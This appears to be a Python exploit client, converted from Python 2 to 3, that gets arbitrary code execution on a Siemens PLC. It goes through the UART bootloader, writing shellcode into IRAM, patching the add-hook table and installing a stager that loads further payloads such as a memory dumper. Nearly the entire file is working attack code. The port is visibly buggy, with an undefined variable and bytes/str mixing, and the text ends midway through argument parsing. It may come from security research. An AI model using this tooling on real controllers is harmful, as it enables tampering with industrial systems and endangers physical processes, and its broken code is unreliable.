#!/usr/bin/env python3
# Would you please hold my beer while I am cleaning this code?
# ./client.py --switch-power --powersupply-host=localhost --powersupply-port=9001 --powersupply-delay=10 run -p payloads/hello_world/hello_world.bin


import struct
import time
import socket
import select
import sys
import subprocess
#import crc32be
import os
import argparse

from binascii import hexlify

from pwn import remote,context,log,xor
context.update(log_level="info", bits=32, endian="big")



# Runtime configs
# The number of seconds to sleep between every request to avoid UART buffer overflows
SEND_REQ_SAFETY_SLEEP_AMT = 0.01


# The default location of the stager payload
STAGER_PL_FILENAME = "payloads/stager/stager.bin"


# The default location of the memory dumping payload used for the dump_mem command
DUMPMEM_PL_FILENAME = "payloads/dump_mem/build/dump_mem.bin"

# The address of the first payload we are injecting
FIRST_PAYLOAD_LOCATION = 0x10010100


# FIRST_PAYLOAD_LOCATION = 0x06D8C300
next_payload_location = FIRST_PAYLOAD_LOCATION

# Maximum number of bytes to be sent in one request (Sending chunks larger than 16 bytes seems to overflow the read buffer)
# MAX_MSG_LEN = 64-2
MAX_MSG_LEN = 192-2

# Addresses used to inject shellcode (different values are possible here)
DEFAULT_STAGER_ADDHOOK_IND = 0x20


# For installing an additional hook, we also assign a default index
DEFAULT_SECOND_ADD_HOOK_IND = 0x1a

#IRAM_STAGER_START = 0x1003AD00
#IRAM_STAGER_END = 0x10040000
IRAM_STAGER_START = 0x10030100
IRAM_STAGER_END = 0x100303FC
#IRAM_STAGER_START = 0x10010000
#IRAM_STAGER_END = 0x10020000
IRAM_STAGER_MAX_SIZE = IRAM_STAGER_END - IRAM_STAGER_START

BOOTLOADER_EMPTY_MEM = 0x20000

# Some constants that make the code a bit more easy to read
ANSW_INVALID_CHECKSUM = b"\xff\x80\x03"
ANSW_ENTER_SUBPROTO_SUCCESS = b"\x80\x00"

# Static Addresses
UART_WRITE_BUF = 0x100367EC
UART_READ_BUF = 0x100366EC
ADD_HOOK_TABLE_START = 0x1003ABA0

# subprotocol handler constants
SUBPROT_80_MODE_IRAM = 1
SUBPROT_80_IOC_SPI = 2
SUBPROT_80_MODE_FLASH = 3
SUBPROT_80_MODE_NOP = 4

SUBPROT_80_MODE_MAGICS = [None, 0x3BC2, 0x9d26, 0xe17a, 0xc54f]


def print_answ(r, answ):
    print("Got answer: {} [{}]".format(answ, hexlify(answ).decode('ascii')))


def calc_checksum_byte(incoming_bytes):
    # Format: <len_byte><byte_00>..<byte_xx><checksum_byte>
    # Checksum: LSB of negative sum of byte values
    # incoming_bytes is expected to be a bytes object
    # incoming_bytes[0] gives the length byte as an integer
    # incoming_bytes[1:incoming_bytes[0]] would be the data if length byte itself is not included in sum
    # Assuming the length byte itself is part of the checksummed data based on typical protocols:
    # sum over all bytes from length_byte up to, but not including, the checksum byte itself.
    # The first byte (incoming_bytes[0]) is the length of the *rest* of the packet (data + checksum).
    # So the actual data to be checksummed is incoming_bytes[0] bytes starting from incoming_bytes[0] itself if the length byte is included.
    # Or incoming_bytes[1] up to incoming_bytes[0] (exclusive of checksum) if length byte indicates length of data following it.

    # The original code: incoming[:ord(incoming[0])]
    # If incoming[0] is length L, it sums L bytes *starting from the first byte*.
    # Example: if incoming = b'\x03ABC', ord(incoming[0]) is 3. It sums b'\x03AB'.
    # This is unusual. Usually, the length byte specifies length of *payload* or *payload+checksum*.
    # Let's stick to the original logic: sum `incoming[0]` bytes starting from `incoming[0]`.
    length_to_sum = incoming_bytes[0]

    current_sum = 0
    for i in range(length_to_sum):
        current_sum += incoming_bytes[i]

    return struct.pack("<i", -current_sum)[0] # returns an int


def send_packet(r, msg_bytes, step=2, sleep_amt=0.01):
    """
    The base function to send a single packet. We need to chunk the packet
    up during transmission as to not overflowing the PLC's UART buffer.

    Parameters
        r: the remote
        msg: the packet to be sent
        step: The number of bytes to send between delays
        sleep_amt: the number of seconds to delay each chunk
    """

    # Length has to fit into 1 byte, buffer also is just 256 bytes
    assert(len(msg_bytes) <= MAX_MSG_LEN)
    time.sleep(SEND_REQ_SAFETY_SLEEP_AMT)
    # First we need to pass the length
    # msg_with_len includes the length byte itself, then the original msg_bytes
    msg_with_len = bytes([len(msg_bytes) + 1]) + msg_bytes # +1 for the checksum byte to be added

    # Then add the checksum to the packet
    # calc_checksum_byte expects a byte string where the first byte is the length of data to sum (including itself)
    # The length here should be len(msg_bytes) + 1 (for checksum)
    # But calc_checksum_byte will use its first byte as count.
    # The structure for checksum calculation is: <Length_of_Payload+ChecksumByte><PayloadBytes>
    # The structure for actual packet is: <Overall_Length_Byte_incl_CS_and_itself><PayloadBytes><ChecksumByte>
    # Let's re-evaluate: calc_checksum_byte is passed a message that *starts* with its length field
    # msg = chr(len(msg)+1)+msg -> if msg was "AB", then it becomes "\x03AB" (len("AB")+1 = 3)
    # calc_checksum_byte("\x03AB") -> ord('\x03') is 3. It sums '\x03', 'A', 'B'. This is wrong.
    # The length byte should indicate the length of the *following data* for checksum, or the length of the *payload part*.

    # Let's assume the original intent for checksum calculation:
    # The message for checksum is: <Length_of_Payload_itself><PayloadBytes>
    # And the final packet is: <OverallLength><PayloadBytes><ChecksumByte>
    # where OverallLength = len(PayloadBytes) + 1 (for checksum byte)

    # Original: msg = chr(len(msg)+1)+msg # This prepends a length field. Let msg_orig be the original "msg"
    # msg_for_checksum_calc = bytes([len(msg_orig)]) + msg_orig # No, this is not what it did.
    # It was: msg_for_checksum_calc = bytes([len(msg_orig)+1]) + msg_orig

    # Let's simplify and assume the packet structure for checksum is <length_of_payload_and_checksum_byte><payload>
    # and this is what calc_checksum_byte receives.
    # And the final packet is <length_of_payload_and_checksum_byte><payload><checksum_byte>

    # msg_bytes is the actual payload here.
    # The first byte of the packet sent is len(payload) + 1 (for checksum byte)
    packet_len_field = len(msg_bytes) + 1
    if packet_len_field > 255:
        raise ValueError("Packet payload too long, length field would exceed 1 byte.")

    # The data over which checksum is calculated starts with this length field, followed by payload
    data_for_checksum = bytes([packet_len_field]) + msg_bytes
    checksum = calc_checksum_byte(data_for_checksum) # checksum is an int

    # Final packet to send
    msg_to_send = data_for_checksum + bytes([checksum])

    log.info("sending packet: {}".format(msg_to_send.hex()))
    for i in range(0, len(msg_to_send), step):
        time.sleep(sleep_amt)
        r.send(msg_to_send[i:i+step])


def recv_packet(r):
    """
    Receive a single packet, verifying and discarding
    checksum and length metadata.

    returns The actual contents of the packet without any metadata
    """

    answ = r.recv(1) # answ is bytes, e.g. b'\x05'
    if not answ:
        log.error("recv_packet: Did not receive length byte.")
        return None
    rem = answ[0] # rem is an int

    # The received length 'rem' is the total number of bytes *following* the length byte itself,
    # including the data bytes and the checksum byte.
    # So, we need to read 'rem' more bytes.

    received_data = b""
    bytes_to_read = rem
    while bytes_to_read > 0:
        add = r.recv(bytes_to_read)
        if not add:
            log.error(f"recv_packet: Expected {bytes_to_read} more bytes, but got none. Received so far: {received_data.hex()}")
            return None # Or raise an exception
        received_data += add
        bytes_to_read -= len(add)

    # Full packet including the prepended length byte and the checksum byte at the end
    full_packet_with_len = answ + received_data

    # The part for checksum validation is full_packet_with_len[:-1]
    # The checksum byte itself is full_packet_with_len[-1] (as an int)

    expected_checksum = calc_checksum_byte(full_packet_with_len[:-1]) # Pass the part including its own length field
    actual_checksum = full_packet_with_len[-1]

    if expected_checksum != actual_checksum:
        print("Checksum validity failed. Got: {} [{}] Expected Checksum: {:02x}, Actual: {:02x}".format(
            full_packet_with_len, full_packet_with_len.hex(), expected_checksum, actual_checksum))
        return None
    else:
        # Return the actual payload, which is after the length byte and before the checksum byte
        return full_packet_with_len[1:-1] # This is bytes


def recv_many(r, verbose=False):
    """
    Receive all packets until an empty packet is received.
    
    This protocol is implemented by some custom payloads such
    as dump_mem to send larger amounts of data at once.
    """

    answ = ""
    stop = False

    while not stop:
        next_chunk = recv_packet(r)
        if verbose and (len(answ) & 0xff) < 16:
            print("Read {}".format(len(answ)))
        if next_chunk == b"": # Empty packet is b""
            stop = True
        else:
            answ += next_chunk
    return answ

def encode_packet_for_stager(chunk):
    """
    Encodes a packet for null-byte free transmission to the stager.
    Xor is used to do the encoding. The key is chosen for the chunk
    not to include null bytes which seem to result in the largest
    amount of failing transmissions over UART.
    
    The encoding has to be reversed on the other side which is
    implemented in the payloads/stager sources
    """
    # chunk is bytes
    for i in range(1, 256): # i is the XOR key
        key_byte = bytes([i])
        # Check if key_byte is in chunk or if key is length of chunk + 2 (original logic)
        if key_byte[0] not in chunk and i != (len(chunk) + 2): # chunk is bytes, so key_byte[0] (int) compared with ints in chunk
            log.info("Sending chunk with xor key: 0x{:02x}".format(i))

            # XOR each byte in the chunk with the key i
            xored_payload = bytes([b ^ i for b in chunk])

            # Prepend the key
            encoded = key_byte + xored_payload

            # Original check: if "\xfe\xfe" in encoded: continue
            # This check needs to be on bytes: if b"\xfe\xfe" in encoded: continue
            # if b"\xfe\xfe" in encoded:
            #     continue
            return encoded # This is bytes

    print("Could not encode chunk: {}".format(chunk.hex()))
    assert (False)

def send_full_msg_via_stager(r, msg_bytes, chunk_size=2, sleep_amt=0.01):
    """
    Transmit an arbitrarily sized message to a listening stager payload.

    The protocol doing the transmission sends an encoded packet, expecting
    an empty acknowledgement packet in return for each packet sent.
    """

    # msg_bytes is the full message to send
    for i in range(0, len(msg_bytes), MAX_MSG_LEN-1):
        time.sleep(SEND_REQ_SAFETY_SLEEP_AMT)
        chunk = msg_bytes[i:i + MAX_MSG_LEN - 1] # chunk is bytes
        log.info("Send progress: 0x{:06x}/0x{:06x} ({:3.2f})".format(i, len(msg_bytes), float(i)/float(len(msg_bytes))))
        send_packet(r, encode_packet_for_stager(chunk), chunk_size, sleep_amt) # encode_packet_for_stager returns bytes
        answ = recv_packet(r) # answ is bytes
        if answ is None:
            print("[ERROR] Did not receive ACK after sending chunk.")
            return None
        if not len(answ) == 1: # Empty ack should be a single byte (e.g. b'\x00' or similar, depends on stager impl)
                               # Original code implies it's a single byte, not zero length.
                               # If stager sends truly empty packet (0 length payload), recv_packet returns b""
                               # and len(answ) would be 0. The original check "len(answ) == 1" seems to imply
                               # the ack packet has a payload of 1 byte.
                               # Let's assume the stager sends back a single byte as ACK.
            print("expecting single-byte ack package, got '{}' (len {}) instead".format(hexlify(answ).decode('ascii'), len(answ)))
            # If the ack is truly empty (b""), then this check should be `if answ != b"":` or similar
            # For now, stick to original logic of expecting 1 byte.
            assert(False)
        if answ == b"\xff": # Check against bytes
            print("[WARNING] Interrupting the sending...")
            return None
    # Send empty packet to signify end of transmission
    send_packet(r, encode_packet_for_stager(b"")) # Pass empty bytes
    answ = recv_packet(r)


def invoke_primary_handler(r, handler_ind, args="", await_response=True):
    """
    Invoke the primary handler with index handler_ind.
    """

    payload = bytes([handler_ind]) # handler_ind is an int
    # args should also be bytes
    if not isinstance(args, bytes):
        raise TypeError("args must be bytes for invoke_primary_handler")
    send_packet(r, payload + args)
    if await_response:
        return recv_packet(r) # Returns bytes
    else:
        return None


def enter_subproto_handler(r, mode, args=""):
    """
    Invoke Primary Handler 0x80 to enter the subprotocol
    in the given mode.
    """
    assert(1 <= mode <= len(SUBPROT_80_MODE_MAGICS))

    # struct.pack already returns bytes
    packed_args = struct.pack(">H", SUBPROT_80_MODE_MAGICS[mode])
    return invoke_primary_handler(r, 0x80, packed_args) # Returns bytes


def leave_subproto_handler(r):
    """ 
    Leave the currently active subprotocol handler
    """
    send_packet(r, bytes([0x81]) + b"\xD0\x67") # Construct bytes packet
    return recv_packet(r) # Returns bytes


def subproto_read(r):
    send_packet(r, bytes([0x83])) # Construct bytes packet
    return recv_packet(r) # Returns bytes

def _raw_subproto_write(r, arg_dw, add_args_bytes, really=False, step=2, sleep_amt=0.01):
    """
    Only use when alredy in subprotocol handler.
    
    This is the raw write protocol (function 3) invocation for the different modes.
    Invoking this function may have different semantics depending on the mode the
    subprotocol handler was entered in.

    No checking on arguments is done. Don't use if you don't exactly know what you
    do as this may cause damage to the system if not used properly.

    The reason for this function being dangerous is that in some modes using this write
    leads to overwriting parts or all of flash memory.
    """

    # This one is dangerous to use as it may mess up stuff in the device
    assert(really == True)
    # struct.pack returns bytes. add_args_bytes should be bytes.
    packet_payload = bytes([0x84]) + b"\x5a\x2e" + struct.pack(">I", arg_dw) + add_args_bytes
    send_packet(r, packet_payload, step, sleep_amt)
    return recv_packet(r) # Returns bytes


def _exploit_write_chunk_to_iram(r, tar, contents_bytes, already_in_80_handler=False):
    """
    This function is part of the exploit and allows writing small chunks
    of bytes into IRAM memory. With the primitive itself being slow and
    unstable, we need some special handling for seemingly magic values to
    make the write process stable.
    """
    # contents_bytes is expected to be bytes
    # Writing more than 4 bytes at a time does not seem stable
    #assert(len(contents_bytes) == 2 or len(contents_bytes)==4 or len(contents_bytes)==8)
    assert(len(contents_bytes) % 2 == 0)
    assert(len(contents_bytes)+8 <= MAX_MSG_LEN) # MAX_MSG_LEN applies to the payload part of send_packet
                                               # _raw_subproto_write payload is 1+2+4+len(add_args_bytes) = 7+len(add_args_bytes)
                                               # So len(add_args_bytes) must be <= MAX_MSG_LEN - 7
                                               # Here add_args_bytes is contents_bytes or len(contents_bytes)*b"\xff"
                                               # So len(contents_bytes) <= MAX_MSG_LEN - 7
    # This is the minimum address we are allowed to write to
    assert(0x10000000 <= tar)
    # This boundary is checked by the bootloader handler
    assert(tar + len(contents_bytes) <= 0x10800000)

    # First enter the 0x80 subprotocol with device/target number 1 for IRAM if we are not already in the handler
    if not already_in_80_handler:
        answ = enter_subproto_handler(r, SUBPROT_80_MODE_IRAM) # Returns bytes
    # In the bootloader handler the base of IRAM memory (0x10000000) is added, so subtract it here
    target_argument = tar-0x10000000

    # First mask the contents with \xff's which allows all transitions
    # len(contents_bytes)*"\xff" should be len(contents_bytes)*b"\xff"
    answ = _raw_subproto_write(r, target_argument, len(contents_bytes) * b"\xff", True) # Returns bytes
    # Perform the write against the 0xffff words now

    # One write that we cannot perform for dwords is a straight 0x0000 word. We have to do that as a single word for some reason
    # contents_bytes[:2] in ["\x00\x00", "\x0a\x00"] should be contents_bytes[:2] in [b"\x00\x00", b"\x0a\x00"]
    if len(contents_bytes) == 4 and \
       (contents_bytes[:2] in [b"\x00\x00", b"\x0a\x00"] or contents_bytes[2:4] in [b"\x00\x00", b"\x0a\x00"]):
        # Split the write into two word writes
        answ = _raw_subproto_write(r, target_argument, contents_bytes[:2], True) # Returns bytes
        answ = _raw_subproto_write(r, target_argument+2, contents_bytes[2:4], True) # Returns bytes
    else:
        # Do the write in one go
        answ = _raw_subproto_write(r, target_argument, contents_bytes, True) # Returns bytes

    # Leave the 0x80 subhandler if needed
    if not already_in_80_handler:
        leave_subproto_handler(r) # Returns bytes
    return answ


def exploit_write_to_iram(r, tar, contents):
    """
    Wrapper function to write a whole payload to IRAM. Call this
    function without entering the subprotocol first. The function
    will:
        1. enter subprotocol handler
        2. align input length to multiple of 4
        3. write contents_bytes in chunks
        4. leave subprotocol handler
    """
    # contents_bytes is expected to be bytes
    assert(len(contents_bytes) % 2 == 0)  # writes are performed word-wise
    # Make sure we stay in bounds with our write
    assert(0x10000000 <= tar and tar + len(contents_bytes) <= 0x10800000)

    # First enter the 0x80 subprotocol with device/target number 1 for IRAM
    answ = enter_subproto_handler(r, SUBPROT_80_MODE_IRAM) # Returns bytes
    assert(answ == ANSW_ENTER_SUBPROTO_SUCCESS) # ANSW_ENTER_SUBPROTO_SUCCESS is bytes

    # Do a single word write at the beginning if the alignment is 2, not 4
    if len(contents_bytes) % 4 == 2:
        _exploit_write_chunk_to_iram(r, tar, contents_bytes[:2], True)
        tar += 2
        contents_bytes = contents_bytes[2:]

    # The chunk_size for _exploit_write_chunk_to_iram's contents_bytes must be <= MAX_MSG_LEN - 7
    # Original chunk_size = 16. If MAX_MSG_LEN is small (e.g. 16), then 16 > 16-7=9. This would fail.
    # MAX_MSG_LEN is 192-2 = 190. So 16 <= 190-7 = 183. This is fine.
    chunk_size = 16
    # From here we have a 4 byte alignment so we can do dword writes only
    for i in range(0, len(contents_bytes), chunk_size):
        print("Writing {:04x}/{:04x}".format(i, len(contents_bytes)))
        chunk = contents_bytes[i:i+chunk_size] # chunk is bytes
        # Perform the write
        answ = _exploit_write_chunk_to_iram(r, tar+i, chunk, True) # Returns bytes

    # Leave subprotocol handler to avoid protocol state side effects
    leave_subproto_handler(r) # Returns bytes
    return answ


def get_version(r):
    """
    Invoke the Primary Handler which returns the protocol version
    """

    hook_ind = 0  # get_version
    send_packet(r, bytes([hook_ind])) # Pass as bytes
    answ = recv_packet(r) # Returns bytes
    return answ


def bye(r):
    """
    Invoke the Primary Handler to leave the primary UART protocol loop.
    """
    hook_ind = 0xa2
    send_packet(r, bytes([hook_ind])) # Pass as bytes
    answ = recv_packet(r) # Returns bytes
    # For good measure check that we got the correct response and we are indeed in sync
    assert(answ == b"\xa2\x00") # Compare with bytes




def invoke_add_hook(r, add_hook_no, args_bytes=b"", await_response=True):
    # Check range for additional hook
    assert(0 <= add_hook_no <= 0x20)
    if not isinstance(args_bytes, bytes):
        raise TypeError("args_bytes must be bytes for invoke_add_hook")

    # Also check that the size of arguments that we input matches the expected value
    # expected_arglen, fn_addr = add_handler_entries[add_hook_no]
    #assert(expected_arglen-3==len(args_bytes) or expected_arglen==0xff)
    hook_ind = 0x1c # This is the primary handler index for "invoke additional hook"

    # The payload for primary handler 0x1c is <add_hook_no_byte><args_bytes>
    payload_for_invoke = bytes([add_hook_no]) + args_bytes

    return invoke_primary_handler(r, hook_ind, payload_for_invoke, await_response) # Returns bytes


def _exploit_install_add_hook(r, tar_addr, shellcode_bytes, add_hook_no):
    """
    Inject shellcode to a location inject a pointer to it into the add_hook table.

    This function is a wrapper around different UART APIs. The following steps are taken:
    1. Write shellcode to tar_addr
    2. Write (length param, function pointer) pair to the specified offset inside the add_hooks table

    After the injection is done the hook should be callable via
            invoke_add_hook(r, add_hook_no)
    """
    # shellcode_bytes is expected to be bytes
    # 0x21 add_hook entries in table
    assert(0 <= add_hook_no <= 0x20)

    # Ensure alignment
    if len(shellcode_bytes) % 2 != 0:
        shellcode_bytes += b"\xff" # Append byte

    exploit_write_to_iram(r, tar_addr, shellcode_bytes) # Takes bytes

    # Data for add_hook table entry: (length param (2 bytes), function pointer (4 bytes))
    # Original: "\x00\xff"+struct.pack(">I", tar_addr)
    # Length param \x00\xff means arg length check disabled.
    # This should be bytes: b"\x00\xff" + struct.pack(">I", tar_addr)
    # The table stores 8 bytes per entry. The first 2 are flags/offset, next 2 are arg_len, next 4 are ptr.
    # Original code writes to `+2`, so it's writing to arg_len and ptr fields.
    # arg_len = 0x00ff (2 bytes), ptr = tar_addr (4 bytes)
    data_for_hook_table = b"\x00\xff" + struct.pack(">I", tar_addr)
    exploit_write_to_iram(r, ADD_HOOK_TABLE_START + 8 * add_hook_no + 2, data_for_hook_table)


def install_stager(r, shellcode_bytes, tar_addr=IRAM_STAGER_START, add_hook_no=DEFAULT_STAGER_ADDHOOK_IND):
    """
    Installs the stager payload as an add_hook entry from a file containing the stager shellcode_bytes.

    Returns the hook_number at which the handler was installed
    """
    # shellcode_bytes is expected to be bytes
    assert(0 < len(shellcode_bytes) <= IRAM_STAGER_MAX_SIZE)
    _exploit_install_add_hook(r, tar_addr, shellcode_bytes, add_hook_no)
    return add_hook_no


def write_via_stager(r, tar_addr, contents_bytes, stager_add_hook_ind=DEFAULT_STAGER_ADDHOOK_IND):
    # contents_bytes is expected to be bytes
    # The stager_add_hook (payloads/stager/stager.S) expects the target address as argument.
    # struct.pack(">I", tar_addr) is already bytes.
    invoke_add_hook(r, stager_add_hook_ind,
                       struct.pack(">I", tar_addr), await_response=False) # Must be False as stager doesn't ACK invoke
    send_full_msg_via_stager(r, contents_bytes, 8, 0.01) # contents_bytes is bytes


def install_addhook_via_stager(r, tar_addr, shellcode_bytes, stager_addhook_ind=DEFAULT_STAGER_ADDHOOK_IND, add_hook_no=DEFAULT_SECOND_ADD_HOOK_IND):
    # shellcode_bytes is expected to be bytes
    # Automatically adjust to the user adding more payloads
    global next_payload_location
    
    # Set up function pointer and disable arbitrary argument length check (by setting value 0xff)
    # Original: "\x00\x00\x00\xff"+struct.pack(">I", tar_addr)
    # This seems to be writing 4 bytes for flags/offset and 4 bytes for function pointer.
    # The table structure is:
    #   +0: u16 flags (e.g. bit0=enabled)
    #   +2: u16 expected_arg_len (0xFFFF means no check)
    #   +4: u32 function_pointer
    # So, to set arg_len to 0xFFFF (no check) and ptr to tar_addr:
    # This should be constructing the part `expected_arg_len` + `function_pointer`
    # Or it's writing the entire 8-byte entry.
    # Original code: write_via_stager(r, ADD_HOOK_TABLE_START+8*add_hook_no, "\x00\x00\x00\xff"+struct.pack(">I", tar_addr), ...)
    # This writes at the base of the entry. So it's [flags_word, arg_len_word, ptr_dword].
    # So it's b"\x00\x00" (flags, e.g. disabled initially?) + b"\x00\xff" (arg_len check disabled) + ptr
    # Let's assume flags=0x0001 (enabled), arg_len=0xFFFF (no check)
    # data_for_table = b"\x00\x01\xff\xff" + struct.pack(">I", tar_addr)
    # The original "\x00\x00\x00\xff" is curious. If it's for the first 4 bytes of the 8 byte entry,
    # it would be flags = 0x0000, arg_len = 0x00ff.
    # Let's replicate the original byte sequence as closely as possible but as bytes:
    table_entry_data = b"\x00\x00\x00\xff" + struct.pack(">I", tar_addr) # This is 8 bytes
    write_via_stager(r, ADD_HOOK_TABLE_START + 8 * add_hook_no, table_entry_data, stager_addhook_ind)


    # Write the code of the handler itself
    write_via_stager(r, tar_addr, shellcode_bytes, stager_addhook_ind)

    if tar_addr == next_payload_location:
        next_payload_location += len(shellcode_bytes)
        while next_payload_location % 4 != 0:
            next_payload_location += 1

    return add_hook_no


def payload_dump_mem(r, tar_addr, num_bytes, addhook_ind):
    """
    This function uses payloads/dump_mem to dump memory contents.
    """
    # The dump_mem payload (if it's "payloads/dump_mem/dump_mem.S") takes "A" + addr (4b) + len (4b)
    # "A" should be b"A"
    args_for_dump = b"A" + struct.pack(">II", tar_addr, num_bytes)
    answ = invoke_add_hook(r, addhook_ind, args_for_dump) # answ is bytes

    log.debug("[payload_dump_mem] answ (len: {}): {}".format(len(answ), hexlify(answ).decode('ascii')))
    assert(answ.startswith(b"Ok")) # Check against bytes
    contents = recv_many(r, verbose=True) # contents is bytes
    return contents



def handle_conn(r, action, args):
    global next_payload_location

    print("[+] Got connection")
    answ = recv_packet(r) # answ is bytes
    print('\x1b[6;30;42m'+ "[+] Got special access greeting: {} [{}]".format(answ, hexlify(answ).decode('ascii'))+ '\x1b[0m')

    for i in range(1):
        version = get_version(r) # version is bytes
        # version[2:3] is a single byte (as bytes type). version[3:-2] is a slice of bytes.
        # To join them, they should be strings.
        # str(ord(c)) for c in version[3:-2] -> str(c_int) for c_int in version[3:-2]
        # version[2:3].decode('ascii', errors='replace')
        # ".".join([str(c) for c in version[3:-2]])
        # Example: version = b"\x01\x02S123\x00\x00" -> version[2:3] = b"S", version[3:-2] = b"123"
        # bootloaderversion = "S." + ".".join(["49", "50", "51"]) = "S.49.50.51"
        # This assumes the version bytes are ASCII representable or single bytes that can be stringified.

        # The original version[2:3] was a single char string. Now it's a single char bytes.
        # version[3:-2] was a string. Now it's bytes. map ord(c) becomes map c for bytes.
        part1 = version[2:3].decode(errors='ignore') # Should be 'S'
        part2_bytes = version[3:-2]
        part2_nums_str = ".".join([str(b) for b in part2_bytes]) # "49.50.51"
        bootloaderversion = part1 + "." + part2_nums_str
        print('\x1b[6;30;42m'+ "[+] Got PLC bootLoader version: " + bootloaderversion + '\x1b[0m')


    # First, always install the stager payload
    # args.stager is opened in 'rb' mode, so read() returns bytes
    stager_shellcode_bytes = args.stager.read()
    start = time.time()
    stager_addhook_ind = install_stager(r, stager_shellcode_bytes) # Takes bytes
    print("Writing the initial stage took {} seconds".format(time.time()-start))

    payload_bytes = None
    if action == ACTION_INVOKE_HOOK:
        payload_bytes = args.payload.read() # args.payload opened in 'rb'
    elif action == ACTION_DUMP:
        payload_bytes = args.payload.read() # args.payload opened in 'rb' (dump_payload)
    elif action == ACTION_TEST:
        payload_bytes = args.payload.read() # args.payload opened in 'rb'
    elif action == ACTION_TIC_TAC_TOE:
        payload_bytes = args.payload.read() # args.payload opened in 'rb'
    elif action == ACTION_HELLO_LOOP:
        payload_bytes = args.payload.read() # args.payload opened in 'rb'
    else:
        print("Unknown action")
        exit(-1)

    if payload_bytes is not None:
        start = time.time()
        second_addhook_ind = install_addhook_via_stager(r, next_payload_location, payload_bytes, stager_addhook_ind) # Takes bytes
        print("Installing the additional hook took {} seconds".format(time.time()-start))

    
    if action == ACTION_INVOKE_HOOK:
        # args.args is a list of strings from nargs='+'. Need to join and encode.
        # Assuming args are space separated and then encoded.
        args_str = "".join(args.args) if args.args else ""
        answ = invoke_add_hook(r, second_addhook_ind, args_str.encode('utf-8')) # answ is bytes
        print("Got answer: {}".format(hexlify(answ).decode('ascii')))

    elif action == ACTION_DUMP:
        if args.outfile is None:
            out_filename = "mem_dump_{:08x}_{:08x}".format(args.address, args.address + args.length)
        else:
            out_filename = args.outfile

        print("dumping a total of {} bytes of memory at 0x{:08x}".format(args.length, args.address))
        contents = payload_dump_mem(r, args.address, args.length, second_addhook_ind) # contents is bytes
        with open(out_filename, "wb") as f: # Open in wb mode
            f.write(contents) # Write bytes
        print("Wrote data out to {}".format(out_filename))
    

    elif action == ACTION_TEST:
        answ = invoke_add_hook(r, second_addhook_ind, b"") # answ is bytes
        print("Got answer: {}".format(hexlify(answ).decode('ascii')))


    elif action == ACTION_HELLO_LOOP:
        # No arguments for hello_loop payload
        answ = invoke_add_hook(r, second_addhook_ind, args_bytes=b"", await_response=False)
        while True:
            packet_data = recv_packet(r) # packet_data is bytes
            print("Got packet: {}".format(hexlify(packet_data).decode('ascii')))

    elif action == ACTION_TIC_TAC_TOE:
        print("[*] Demonstrating Code Execution")
        # No arguments for tictactoe payload
        invoke_add_hook(r, second_addhook_ind, args_bytes=b"", await_response=False)

        msg_bytes = b""
        END_TOKEN_BYTES = b"==>" # Token is bytes

        while END_TOKEN_BYTES not in msg_bytes:
            current_chunk = recv_packet(r) # current_chunk is bytes
            if current_chunk is None: # Handle error case from recv_packet
                log.error("TicTacToe: Failed to receive packet from PLC.")
                break
            msg_bytes += current_chunk # Concatenate bytes with bytes for partial messages if necessary
                                      # However, recv_packet should return a full application message.
                                      # If TicTacToe sends messages line by line, msg_bytes should be reset.
                                      # For now, assume it can be cumulative if END_TOKEN spans packets.
                                      # More likely, msg from recv_packet is one "line" from game.

            # Attempt to decode for printing and checking.
            # sys.stdout.write expects string.
            try:
                msg_str_for_display = current_chunk.decode('utf-8', errors='replace')
            except AttributeError: # If current_chunk is None
                msg_str_for_display = "[Error receiving data]\n"

            sys.stdout.write(msg_str_for_display)
            sys.stdout.flush()

            if "enter a number" in msg_str_for_display: # Check in decoded string
                choice_str = input() # input() returns string in Py3
                # Send the first character of the choice, encoded.
                if choice_str: # Ensure choice is not empty
                    send_packet(r, choice_str[0].encode('utf-8')) # Send first char as bytes
                else:
                    send_packet(r, b"\n") # Or send a newline / default if empty

        print("\n[*] Done here!") # Add newline for clarity after game output


    # END test code
    print("Saying bye...")
    if args.cont:
        bye(r)
    else:
        input("Press to continue loading firmware...") # raw_input -> input
        bye(r)


# To trigger the update protocol via UART, we need to send a clean magic string
magic = b"MFGT1" # Bytes literal
# The number of bytes of the handshake is 5, so with a leading "M" already in the pool and others being ignored, we need at most 4 junk bytes
pad = 4*b"A" # Bytes literal

ACTION_INVOKE_HOOK = "invoke"
ACTION_DUMP = 'dump'
ACTION_TEST = "test"
ACTION_TIC_TAC_TOE = "tictactoe"
ACTION_HELLO_LOOP = "hello_loop"
def main():
    parser = argparse.ArgumentParser(description='Trigger code execution on Siemens PLC')

    parser.add_argument('-P', '--port', dest='port', type=lambda x: int(x, 0),
                        help="local port that socat is listening to, forwarding to serial device (may also be a port forwarded via SSH", required=True)
    parser.add_argument('--switch-power', dest='switch_power', default=False, action='store_true',
                        help='switch the power adapter on and off')
    parser.add_argument('--powersupply-host', dest='powersupply_host', default='powersupply',
                        help='host of powersupply, defaults to "powersupply", can be changed to support ssh port forwarding (for web method)')
    parser.add_argument('--powersupply-port', dest='powersupply_port', default=80, type=lambda x: int(x, 0),
                        help="port of powersupply. defaults to 80, can be changed to support ssh port forwarding (for web method)")
    parser.add_argument('--powersupply-delay', dest='powersupply_delay', default=60, type=lambda x: int(x, 0),
                        help="number of seconds to wait before turning on power supply. defaults to 60.")
    parser.add_argument('--powersupply-method', dest='powersupply_method', default='web', choices=['web', 'arduino', 'fx3u'],
                        help='Method to control the power supply (web, arduino, fx3u). Default: web.')
    parser.add_argument('--powersupply-arduino-port', dest='powersupply_arduino_port',
                        help='Serial port for Arduino (e.g., /dev/ttyUSB0). Required if --powersupply-method is arduino.')
    parser.add_argument('--powersupply-baud-rate', dest='powersupply_baud_rate', default=9600, type=int,
                        help='Baud rate for Arduino serial communication. Default: 9600.')

    # FX3U Power Supply Options
    ps_fx3u_group = parser.add_argument_group('Power Supply Mitsubishi FX3U Options')
    ps_fx3u_group.add_argument('--powersupply-fx3u-ip', dest='powersupply_fx3u_ip',
                               help='IP address of the Mitsubishi FX3U PLC (for --powersupply-method fx3u).')
    ps_fx3u_group.add_argument('--powersupply-fx3u-port', dest='powersupply_fx3u_port', type=lambda x: int(x, 0),
                               help='Port for MC Protocol on FX3U PLC (for --powersupply-method fx3u). Defaults to 502 if not specified (via switch_power.py).')
    ps_fx3u_group.add_argument('--powersupply-fx3u-output', dest='powersupply_fx3u_output',
                               help="Output address on FX3U PLC (e.g., 'Y0') (for --powersupply-method fx3u).")

    parser.add_argument('-s', '--stager', dest="stager", type=argparse.FileType('rb'), default=STAGER_PL_FILENAME, # Changed 'r' to 'rb'
